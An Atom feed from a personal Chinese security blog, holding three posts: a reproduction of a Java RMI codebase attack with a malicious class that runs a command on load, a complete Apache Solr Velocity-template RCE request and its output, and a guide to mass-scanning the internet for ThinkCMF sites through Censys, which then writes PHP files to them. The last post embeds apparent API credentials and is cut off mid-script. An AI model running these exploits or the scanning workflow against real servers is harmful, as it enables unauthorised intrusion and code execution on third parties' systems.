<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kage&#39;s blog</title>
  
  <subtitle>Kage&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-12-13T15:54:44.084Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Kage</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java安全之攻击RMI Registry</title>
    <link href="http://yoursite.com/2019/12/13/java%E5%AE%89%E5%85%A8%E4%B9%8B%E6%94%BB%E5%87%BBRMI%20Registry/"/>
    <id>http://yoursite.com/2019/12/13/java安全之攻击RMI Registry/</id>
    <published>2019-12-13T15:54:44.000Z</published>
    <updated>2019-12-13T15:54:44.084Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学习java安全，复现了一下攻击RMI的流程，其中遇到挺多坑的，记录一下。</p><h2 id="RMI介绍"><a href="#RMI介绍" class="headerlink" title="RMI介绍"></a>RMI介绍</h2><p>RMI全称是Remote Method Invocation，远程方法调用。它支持存储于不同于地址空间的程序及对象之间进行彼此通信，实现远程兑现之间的无缝远程调用。</p><p><strong>RMI的交互图：</strong><br><img src="/img/1575187545875.png" alt=""></p><p>RMI由3个部分构成：</p><ul><li>1、registry：JDK提供的一个可以独立运行的程序，在bin目录下</li><li>2、server：对外提供远程对象</li><li>3、client：想要调用远程对象的方法</li></ul><p>调用流程：<br>server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的（Naming、Context、Registry）等类的bind或rebind方法将刚才实例化好的实现类注册到registry上并对外暴露一个名称。<br>client端通过一个已知的名称和rmi url地址通过RMI提供的Naming、Context、Registry等类的lookup方法从RMIService那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了。</p><h3 id="RMI简单示例"><a href="#RMI简单示例" class="headerlink" title="RMI简单示例"></a>RMI简单示例</h3><p>Server端实现有三个要素：</p><ul><li>1、一个集成了<code>java.rmi.Remote</code>的接口，其中定义我们要远程调用的函数</li><li>2、一个实现了此接口的类，需要继承自<code>java.rmi.server.UnicastRemoteObject</code>类</li><li>3、一个调用类，用来创建Registry，并将上面的实例化后绑定到一个地址</li></ul><p><strong>1、定义一个远程接口</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package server;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public interface IRemoteHelloWorld extends Remote&#123;</span><br><span class="line">    public String hello() throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>2、实现接口类</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package server;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">import server.IRemoteHelloWorld;</span><br><span class="line"></span><br><span class="line">public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld&#123;</span><br><span class="line"></span><br><span class="line">    private int number;</span><br><span class="line"></span><br><span class="line">    protected RemoteHelloWorld() throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">        number = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String hello() throws RemoteException &#123;</span><br><span class="line">        number++;</span><br><span class="line">        System.out.println(&quot;Number of Call = &quot; + number);</span><br><span class="line">        return &quot;Hello world&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>3、实现调用类</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package server;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import server.RemoteHelloWorld;</span><br><span class="line"></span><br><span class="line">public class RemoteServer &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        RemoteHelloWorld h = new RemoteHelloWorld();</span><br><span class="line">        LocateRegistry.createRegistry(1099);</span><br><span class="line">        Naming.rebind(&quot;rmi://192.168.169.152:1099/Hello&quot;,h);</span><br><span class="line">        System.out.println(&quot;server ready...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Client端实现需要两个要素：</p><ul><li>1、获取server端的接口</li><li>2、利用java.rmi.Naming的lookup方法获取对象</li></ul><p><strong>Client实现</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package client;</span><br><span class="line">import server.IRemoteHelloWorld;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line"></span><br><span class="line">public class RemoteClient &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        IRemoteHelloWorld hello = (IRemoteHelloWorld)Naming.lookup(&quot;rmi://127.0.0.1:1099/Hello&quot;);</span><br><span class="line">        String ret = hello.hello();</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="RMI通信过程分析"><a href="#RMI通信过程分析" class="headerlink" title="RMI通信过程分析"></a>RMI通信过程分析</h3><p>为了理解RMI的通信过程，我们用wireshark抓包看看：<br><img src="/img/1575191032202.png" alt=""><br>这就是完整的通信过程，可以发现，整个过程进行了两次TCP握手，也就是我们实际建立了两次TCP连接。</p><p>第一次建立TCP连接是连接到远端<code>192.168.169.152</code>的1099端口，这也就是我们在代码里看到的端口，二者进行沟通后，我向服务器端发送了一个“Call”信息，远端回复了一个“ReturnData”消息，然后我新建了一个TCP连接，连接到远程的38227端口。</p><p>那为什么我会连接到38227端口？</p><p>通过阅读数据包我们会发现，在“ReturnData”这个包中，返回了目标的IP地址<code>192.168.169.152</code>，其后跟的一个字节<code>00 00 95 53</code>对应十进制就是<code>38227</code>，刚好就是整数38227的网络序列<br><img src="/img/1575191551982.png" alt=""><br>其实这段数据流中的<code>AC ED</code>开始往后就是Java序列化数据了，IP和端口号只是这个对象的一部分罢了。</p><p>所以最后捋一捋整个过程，首先客户端连接Registry，并在其中寻找Name是Hello的对象，这个对应数据流中的Call消息；然后Registry返回一个序列化数据，这个就是找到的Name=Hello的对象，这个对应数据流中的ReturnData消息；客户端反序列化该对象，发现该对象是一个远程对象，地址在<code>192.168.169.152:38227</code>，于是再与这个地址建立TCP连接；在这个新的连接中，才执行真正远程方法调用，也就是hello()。</p><p>可以总结一下，RMI分为两步，第一步1099只是客户端访问registry的端口获取序列化数据，第二步通过序列化数据得到38227新端口，通过该端口进行方法调用。</p><h2 id="如何攻击RMI-Registry？"><a href="#如何攻击RMI-Registry？" class="headerlink" title="如何攻击RMI Registry？"></a>如何攻击RMI Registry？</h2><p>RMI可以通过codebase执行任意代码，在RMI远程加载的场景中，会涉及到codebase。</p><p>codebase是一个地址，告诉java迅疾我们应该从哪个地方去搜索类，有点像我们日常用的CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p><p>如果我指定<code>codebase=http://www.example.com/</code>，然后加载<code>k4ge.Example</code>类，则Java虚拟机会访问该url地址，并下载这个文件<code>http://www.example.com/k4ge/Example.class</code>，并作为Example类的字节码。</p><p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果服务器端反序列化时发现一个对象，那么就会去自己的CLASSPATH寻找相对应的类；如果本地没有找到这个类，就会去远程加载codebase中的类。</p><p>这个时候问题就来了，如果codebase被控制，我们就可以加载恶意类了吗？</p><p>对，在RMI中，我们可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去CLASSPATH和我们指定的codebase寻找类，由于codebase被我们控制所以可以导致任意命令执行漏洞。</p><p>不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击：</p><ul><li>安装并配置了SecurityManager</li><li>Java版本低于7u21、6u45，或者设置了<code>java.rmi.server.useCodebaseOnly=false</code>其中<code>java.rmi.server.useCodebaseOnly</code>是在Java 7u21、6u45的时候修改的一个默认配置。<br>官方将<code>java.rmi.server.useCodebaseOnly</code>的默认值由<code>false</code>改为<code>true</code>。在<code>java.rmi.server.useCodebaseOnly</code>配置为<code>true</code>的情况下，Java虚拟机将只信任预先配置好的<code>codebase</code>，不再支持从RMI请求中获取。</li></ul><h3 id="复现RMI-codebase漏洞"><a href="#复现RMI-codebase漏洞" class="headerlink" title="复现RMI codebase漏洞"></a>复现RMI codebase漏洞</h3><p>建立如下4个文件，实现方法功能其实就是获取一个<code>Interger</code>的动态数组，对其求和并返回结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">//ICalc.java</span><br><span class="line">package codeserver;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public interface ICalc extends Remote&#123;</span><br><span class="line">    public Integer sum(List&lt;Integer&gt; params) throws RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//Calc.java</span><br><span class="line">package codeserver;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class Calc extends UnicastRemoteObject implements ICalc&#123;</span><br><span class="line">    public Calc() throws RemoteException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    public Integer sum(List&lt;Integer&gt; params) throws RemoteException &#123;</span><br><span class="line">        Integer sum = 0;</span><br><span class="line">        for(Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        return sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//RemoteRMIServer.java</span><br><span class="line">package codeserver;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class RemoteRMIServer &#123;</span><br><span class="line">    private void start() throws Exception &#123;</span><br><span class="line">        if(System.getSecurityManager() == null) &#123;</span><br><span class="line">            System.out.println(&quot;setup SecurityManager&quot;);</span><br><span class="line">            System.setSecurityManager(new SecurityManager());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Calc h = new Calc();</span><br><span class="line">        LocateRegistry.createRegistry(1099);</span><br><span class="line">        Naming.rebind(&quot;refObj&quot;,h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        new RemoteRMIServer().start();</span><br><span class="line">        System.out.println(&quot;server ready...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//client.policy</span><br><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>编译运行服务器端，我是用的idea，需要配置VM options，如下：<br><code>-Djava.rmi.server.useCodebaseOnly=false -Djava.security.manager -Djava.security.policy=&quot;D:\java\rmi\src\codeserver\client.policy&quot;</code></p><p>然后，建立一个RMIClient.java进行攻击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package codeclient;</span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import codeserver.ICalc;</span><br><span class="line"></span><br><span class="line">public class RMIClient implements Serializable&#123;</span><br><span class="line">    public class Payload extends ArrayList&lt;Integer&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">    public void lookup() throws Exception &#123;</span><br><span class="line">        ICalc r = (ICalc)Naming.lookup(&quot;rmi://127.0.0.1:1099/refObj&quot;);</span><br><span class="line">        List&lt;Integer&gt; li = new Payload();</span><br><span class="line">        li.add(3);</span><br><span class="line">        li.add(4);</span><br><span class="line"></span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        new RMIClient().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个Client我们需要在另一个位置运行，因为我们需要让RMI Server在本地CLASSPATH中找不到Payload类，然后才会去codebase中加载Payload类，而Payload类可以是我们事先构造好的恶意类。</p><p>运行RMIClient，需要配置以下VM options参数，如下：<br><code>-Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://www.example.com/</code></p><p>查看www.example.com的日志，可以看见收到了来自服务器端java的请求<code>/RMIClent$Payload.class</code>。<br><img src="/img/1575193460105.png" alt=""><br>我们只需要编译一个恶意类，将其class文件放置在Web服务器的<code>/RMIClent$Payload.class</code>即可。</p><p>因此我们可以将恶意类放在该服务器上，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">package codebase.client;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line"></span><br><span class="line">public class Payload extends ArrayList&#123;</span><br><span class="line">   static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            Process pc = rt.exec(&quot;calc&quot;);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>服务器端加载该类，就会自动执行static块中的代码，从而造成远程命令执行。<br><img src="/img/1576252422816.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在学习java安全，复现了一下攻击RMI的流程，其中遇到挺多坑的，记录一下。&lt;/p&gt;
&lt;h2 id=&quot;RMI介绍&quot;&gt;&lt;a href=&quot;#
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>java 0day整理</title>
    <link href="http://yoursite.com/2019/10/31/java%200day%E6%95%B4%E7%90%86/"/>
    <id>http://yoursite.com/2019/10/31/java 0day整理/</id>
    <published>2019-10-31T14:19:03.000Z</published>
    <updated>2019-10-31T14:19:03.550Z</updated>
    
    <content type="html"><![CDATA[<h2 id="solr模板命令执行"><a href="#solr模板命令执行" class="headerlink" title="solr模板命令执行"></a>solr模板命令执行</h2><p>1、先添加一个collection，比如test<br>2、然后发送两个数据包，第二个数据包最好自己get访问<br>正常成功返回都是200<br>指纹：80.http.get.body: “Solr Query Syntax”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Apache Solr RCE via Velocity template</span><br><span class="line"></span><br><span class="line">Set &quot;params.resource.loader.enabled&quot; as true.</span><br><span class="line"></span><br><span class="line">Request:</span><br><span class="line">========================================================================</span><br><span class="line">POST /solr/test/config HTTP/1.1</span><br><span class="line">Host: solr:8983</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RCE via velocity template</span><br><span class="line">Request:</span><br><span class="line">========================================================================</span><br><span class="line">GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1</span><br><span class="line">Host: localhost:8983</span><br><span class="line">========================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Response:</span><br><span class="line">========================================================================</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html;charset=utf-8</span><br><span class="line">Content-Length: 56</span><br><span class="line"></span><br><span class="line">     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)</span><br><span class="line">========================================================================</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;solr模板命令执行&quot;&gt;&lt;a href=&quot;#solr模板命令执行&quot; class=&quot;headerlink&quot; title=&quot;solr模板命令执行&quot;&gt;&lt;/a&gt;solr模板命令执行&lt;/h2&gt;&lt;p&gt;1、先添加一个collection，比如test&lt;br&gt;2、然后发送两个数据
      
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>Thinkcmf批量搜漏洞并提交到漏洞平台</title>
    <link href="http://yoursite.com/2019/10/24/Thinkcmf%E6%89%B9%E9%87%8F%E6%90%9C%E6%BC%8F%E6%B4%9E%E5%B9%B6%E6%8F%90%E4%BA%A4%E5%88%B0%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0/"/>
    <id>http://yoursite.com/2019/10/24/Thinkcmf批量搜漏洞并提交到漏洞平台/</id>
    <published>2019-10-24T15:25:06.000Z</published>
    <updated>2019-10-24T15:25:06.228Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近Thinkcmf爆出了一个0day，可以利用该漏洞在网站根目录下写文件，并可以访问，从而触发代码执行漏洞。对于刚爆出的漏洞，我们如何进行全网扫描，并快速提交到漏洞平台，这是本文所要介绍的。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先我们要先知道thinkcmf的指纹，然后通过指纹利用搜索引擎进行批量获取目标，将目标入库整理，再对目标测试是否有漏洞，有漏洞的目标再获取目标具体信息，最后提交到漏洞平台，具体可以分成以下几个阶段。</p><ul><li>获取指纹</li><li>搜索目标</li><li>目标入库</li><li>检测目标</li><li>获取目标信息</li><li>提交漏洞</li></ul><h2 id="获取指纹"><a href="#获取指纹" class="headerlink" title="获取指纹"></a>获取指纹</h2><p>可以先利用fofa、钟馗之眼、shodan等来获取少量目标网站，通过对目标网站抓包，查看返回包具体特征，来获取网站的web指纹。常见的web指纹有特殊的目录信息、hearder头信息、前端模板信息等。<br>通过以上方法，获得thinkcmf的指纹：<code>x_powered_by:ThinkCMF</code></p><h2 id="搜索目标"><a href="#搜索目标" class="headerlink" title="搜索目标"></a>搜索目标</h2><p>有了指纹，那么我们如何快速搜索目标呢，可以利用api调用各个搜索引擎写脚本来批量获取。<br>选择什么搜索引擎？本人推荐Google和Censys，有钱的可以使用fofa和Zoomeye。<br>Censys搜索引擎免费用户就可以查询1000条数据，是相当实惠的，而其他网络空间搜索引擎需要付费。<br>Censys语法：</p><ul><li>80.http.get.status_code: 200         //80端口get请求状态码为200</li><li>8080.http.get.body: xxx            //8080端口get请求body中xxx</li><li>8080.http.get.metadata.product: tomcat  //制定中间件</li><li>metadata.os:windows            //指定系统版本</li><li>location.country:China      //指定地区</li></ul><p>帮助文档：<a href="https://censys.io/api/v1/docs/search" target="_blank" rel="noopener">https://censys.io/api/v1/docs/search</a><br>thinkcmf搜索语法：<code>80.http.get.headers.x_powered_by:ThinkCMF and location.country:China</code></p><p>Censys api调用简介：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  “query”:“80.http.get.headers.server: Apache”,#必填搜索语法</span><br><span class="line">  “page”:1,#返回第几页数据</span><br><span class="line">  “fields”:[“ip”, “location.country”],#限定返回的字段</span><br><span class="line">  “flatten”:true#返回格式无内嵌</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用api和多线程写脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import pymysql</span><br><span class="line"># 输入：ip，功能：将list中的数据插入到数据库</span><br><span class="line">def insertDB(ip):</span><br><span class="line">conn = pymysql.connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;thinkcmf&quot;)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">for name in ip:</span><br><span class="line">try:</span><br><span class="line">cursor.execute(&quot;insert into website(ip) values (&apos;%s&apos;)&quot; % name[&apos;ip&apos;])</span><br><span class="line">except:</span><br><span class="line">print(&quot;ip重复：%s&quot; % name)</span><br><span class="line">conn.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"># api地址</span><br><span class="line">api_url = &quot;https://www.censys.io/api/v1&quot;</span><br><span class="line"># 请求内容</span><br><span class="line">query = &apos;80.http.get.headers.x_powered_by:ThinkCMF&apos;</span><br><span class="line"># 个人私钥匙</span><br><span class="line">uid = &quot;ccf3d2b3-0f83-4a51-a4ae-cd5d17f2de76&quot;</span><br><span class="line"># 个人私钥密码</span><br><span class="line">secret = &quot;ci6LVImltFzBYgdhUnWlvN9VSxqTk7Bh&quot;</span><br><span class="line"></span><br><span class="line"># 免费用户只能请求1000条，循环前10页，每页100条</span><br><span class="line">for i in range(1,11):</span><br><span class="line">data = &#123;&quot;query&quot;:query,&quot;page&quot;:i,&quot;fields&quot;:[&quot;ip&quot;]&#125;</span><br><span class="line">res = requests.post(api_url + &quot;/search/ipv4&quot;, data=json.dumps(data), auth=(uid,secret))</span><br><span class="line">results = res.json()</span><br><span class="line"># 将ip数据入库</span><br><span class="line">insertDB(results[&apos;results&apos;])</span><br><span class="line">print(&quot;%d ok&quot; % i)</span><br></pre></td></tr></table></figure></p><h2 id="检测目标"><a href="#检测目标" class="headerlink" title="检测目标"></a>检测目标</h2><p>通过网上报出的payload，通过分析是可以进行自动化调用的，payload：<br><code>http://test.com/?a=fetch&amp;templateFile=public/index&amp;prefix=&#39;&#39;&amp;content=&lt;php&gt;file_put_contents(&#39;test.php&#39;,base64_decode(&#39;PD9waHAgcGhwaW5mbygpOyA/Pg==&#39;))&lt;/php&gt;</code><br>该payload意思是在网站根目录下写入一个test.php文件，内容为phpinfo信息。因而我们可以访问这个test.php，查看phpinfo信息来判断漏洞是否存在，如果存在将数据库的对应ip位置设置为1。</p><p>检测函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 两次请求检测目标是否存在漏洞</span><br><span class="line">def check(ip):</span><br><span class="line">payload = &quot;?a=fetch&amp;templateFile=public/index&amp;prefix 